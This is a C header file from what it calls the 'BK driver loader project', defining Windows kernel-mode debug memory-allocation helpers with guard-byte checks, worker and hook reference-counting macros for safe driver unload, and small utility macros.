//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// BK driver loader project. Version 2.9.2
//	
// module: kdbg.h
// $Revision: 39 $
// $Date: 2012-05-02 15:38:09 +0400 (Ср, 02 май 2012) $
// description: 
//	Kernel-mode debug support routines and constants.


#if	DBG
	#define	_TRACE_ALLOC	TRUE
#endif

#define		BAD_PTR		(PVOID)(ULONG_PTR)0xBAADF00D

#ifdef _TRACE_ALLOC

typedef struct _DBG_ALLOC
{
	unsigned long Size;
	unsigned long Sing;
	char  Buffer[1];
}DBG_ALLOC,*PDBG_ALLOC;


__inline PVOID DbgAllocPool(POOL_TYPE PoolType, SIZE_T Size, ULONG Tag)
{
	PVOID mem = ExAllocatePoolWithTag(PoolType, Size + 16, Tag);
	if (mem)
	{
		PDBG_ALLOC pd = (PDBG_ALLOC) mem;
		memset(mem, 0xcc, Size+16);
		pd->Size = (unsigned long) Size;
		return(&pd->Buffer);
	}
	return(mem);
}

__inline VOID DbgFreePool(PVOID mem)
{
	PDBG_ALLOC pd = CONTAINING_RECORD(mem, DBG_ALLOC, Buffer);
	if (*(unsigned long*)((PCHAR)pd->Buffer + pd->Size)!= 0xcccccccc)
		__debugbreak();
	if (pd->Sing != 0xcccccccc)
		__debugbreak();
	ExFreePool(pd);
}


#define		MyAllocatePoolWithTag(x, y, z)	DbgAllocPool(x, y, z)
#define		MyAllocatePool(x, y)			DbgAllocPool(x, y, 0)
#define		MyFreePool(x)					{DbgFreePool(x);x = BAD_PTR;}	

#else	// TRACE_ALLOC

#define		MyAllocatePoolWithTag(x, y, z)	ExAllocatePoolWithTag(x, y, z)
#define		MyAllocatePool(x, y)			ExAllocatePoolWithTag(x, y, 0)
#define		MyFreePool(x)					ExFreePool(x)	

#endif


// Constant string length
#define		cstrlenA(x)		(sizeof(x)-1)
#define		cstrlenW(x)		((sizeof(x) / sizeof(WCHAR)) - 1)



#ifdef	_DRIVER_SUPPORTS_UNLOAD
LONG volatile	g_WorkerEntryCount;
	
#define			ENTER_WORKER()	InterlockedIncrement(&g_WorkerEntryCount)
#define			LEAVE_WORKER()	InterlockedDecrement(&g_WorkerEntryCount)

_inline VOID WaitForWorkers(VOID)
{
	do
	{
		LARGE_INTEGER	Period = {0};
		Period.QuadPart = _RELATIVE(_MILLISECONDS(100));
		KeDelayExecutionThread(KernelMode, TRUE, &Period);
	} while(g_WorkerEntryCount);
}


#else

#define			ENTER_WORKER()	
#define			LEAVE_WORKER()	
#define			WaitForWorkers()

#endif


#define			ENTER_HOOK	ENTER_WORKER
#define			LEAVE_HOOK	LEAVE_WORKER
#define			WaitForHooks()	WaitForWorkers()


#define		_ALIGN(x, y)	((x + (y - 1)) & ~(y - 1))